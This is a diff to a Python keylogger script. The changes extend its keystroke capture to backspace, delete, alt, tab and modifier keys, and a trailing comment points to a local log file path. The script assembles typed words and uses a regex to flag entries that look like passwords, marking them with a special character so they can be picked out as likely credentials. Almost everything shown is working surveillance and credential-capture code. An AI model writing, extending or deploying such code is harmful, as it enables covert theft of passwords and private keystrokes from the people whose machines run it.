@@ -4,6 +4,7 @@ import re
 import time
 from functools import partial
 import threading
+import os
 
 def check_pass(password) -> bool:
     pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
@@ -28,22 +29,39 @@ def keyPressed(key, file_path):
         try:
             if hasattr(key, 'char'):  # Regular character
                 word += key.char
-                
-                #logKey.write(key.char)
-            elif key == keyboard.Key.space:  # Space
-                #log_file.write(word)
-                buffer_words.append(word)
-                word = ""
 
-            elif key == keyboard.Key.enter:  # Enter
+            elif key == keyboard.Key.space:  # Space key
+                buffer_words.append(word)  # Add the current word to the buffer
+                word = ""  # Reset the word
+
+            elif key == keyboard.Key.enter:  # Enter key
                 if check_pass(word):
-                    word = "¿" + word
-
-                #log_file.write(word)
+                    word = "¿" + word  # Mark password-like words
                 buffer_words.append(word)
-                word = ""
+                word = ""  # Reset the word
+
+            elif key == keyboard.Key.backspace:  # Backspace key
+                # Remove the last character from the current word, if any
+                word = word[:-1]
+
+            elif key == keyboard.Key.delete:  # Delete key
+                # Optional: Handle delete key, e.g., log a delete event
+                buffer_words.append("[DELETE]")
+
+            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
+                buffer_words.append(f"[{key.name.upper()}]")  # Log the special key press
+
+            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
+                # Optionally log modifier key presses
+                buffer_words.append(f"[{key.name.upper()}]")
+
+            else:
+                # Log any unhandled special key presses
+                buffer_words.append(f"[{key}]")
+
         except Exception as e:
             print("Error:", e)
+
 
 '''
 file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
